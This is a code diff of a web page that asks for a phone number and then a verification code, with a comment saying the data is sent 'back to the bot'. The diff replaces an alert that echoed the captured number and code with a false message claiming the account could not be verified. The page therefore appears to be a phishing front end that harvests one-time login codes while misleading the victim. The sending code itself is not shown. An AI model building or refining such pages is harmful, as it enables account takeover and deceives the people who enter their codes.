@@ -103,19 +103,17 @@
 
         <div class="input-group">
             <label for="countryCode">Country</label>
-            <!-- Country Code Dropdown -->
-            <select id="countryCode">
-                <option value="+61">🇦🇺 Australia (+61)</option>
-                <option value="+1">🇺🇸 United States (+1)</option>
-                <option value="+44">🇬🇧 United Kingdom (+44)</option>
-                <option value="+49">🇩🇪 Germany (+49)</option>
-                <option value="+33">🇫🇷 France (+33)</option>
-                <option value="+81">🇯🇵 Japan (+81)</option>
-                <option value="+91">🇮🇳 India (+91)</option>
-                <option value="+86">🇨🇳 China (+86)</option>
-                <option value="+7">🇷🇺 Russia (+7)</option>
-                <option value="+82">🇰🇷 South Korea (+82)</option>
-                <!-- Add more countries here -->
+            <select id="countryCode" onchange="updatePhoneNumberPrefix()">
+                <option value="+61" data-flag="🇦🇺">🇦🇺 Australia (+61)</option>
+                <option value="+1" data-flag="🇺🇸">🇺🇸 United States (+1)</option>
+                <option value="+44" data-flag="🇬🇧">🇬🇧 United Kingdom (+44)</option>
+                <option value="+49" data-flag="🇩🇪">🇩🇪 Germany (+49)</option>
+                <option value="+33" data-flag="🇫🇷">🇫🇷 France (+33)</option>
+                <option value="+81" data-flag="🇯🇵">🇯🇵 Japan (+81)</option>
+                <option value="+91" data-flag="🇮🇳">🇮🇳 India (+91)</option>
+                <option value="+86" data-flag="🇨🇳">🇨🇳 China (+86)</option>
+                <option value="+7" data-flag="🇷🇺">🇷🇺 Russia (+7)</option>
+                <option value="+82" data-flag="🇰🇷">🇰🇷 South Korea (+82)</option>
             </select>
         </div>
 
@@ -128,7 +126,6 @@
             <input type="checkbox" id="keepSignedIn"> Keep me signed in
         </div>
 
-        <!-- Next Button -->
         <button class="button" onclick="goToVerificationPage()">Next</button>
     </div>
 
@@ -142,14 +139,19 @@
             <input type="number" id="verificationCode" placeholder="Code">
         </div>
 
-        <!-- Submit Button -->
         <button class="button" onclick="submitVerification()">Submit</button>
     </div>
 
     <script>
+        function updatePhoneNumberPrefix() {
+            const countryCode = document.getElementById('countryCode').value;
+            const phoneNumberField = document.getElementById('phoneNumber');
+            phoneNumberField.value = countryCode + ' ' + phoneNumberField.value.replace(/^\+\d+\s*/, '');
+        }
+
         function goToVerificationPage() {
             const countryCode = document.getElementById('countryCode').value;
-            const phoneNumber = document.getElementById('phoneNumber').value;
+            const phoneNumber = document.getElementById('phoneNumber').value.replace(/^\+\d+\s*/, '');
             const fullPhoneNumber = `${countryCode} ${phoneNumber}`;
 
             if (phoneNumber === '') {
@@ -174,7 +176,8 @@
 
             // Send data back to the bot
             // This would typically involve an AJAX request or some other method of communication
-            alert(`Phone Number: ${phoneDisplay}\nVerification Code: ${verificationCode}`);
+
+            alert(`Sorry, we could not verify an account with the phone number: ${phoneDisplay}`);
 
             // Reset form for another use
             document.getElementById('initialContainer').style.display = 'block';
